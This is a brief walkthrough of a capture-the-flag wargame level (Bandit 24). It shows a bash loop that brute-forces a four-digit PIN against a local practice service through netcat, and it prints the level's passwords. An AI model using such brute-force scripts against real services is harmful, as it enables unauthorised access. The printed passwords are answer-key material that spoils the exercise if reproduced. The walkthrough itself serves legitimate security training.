# Bandit Level 24

In this challenge we have to submit the current level's password and a secret 4-character password to a server. We are told that there is no better way than to try every combination.

We need to write a script to do this for us, because doing it by hand would take a very long time. Here is an example of one:
```sh
#!/bin/bash
password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for i in {0000..9999}; do
    echo $password $i >>list.txt
done
```
After running this script we can submit `list.txt` to `localhost:30002`
> `cat list.txt | nc localhost 30002`

This command will eventually provide the correct 4-character code to the server, at which point it will respond with the password: `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`
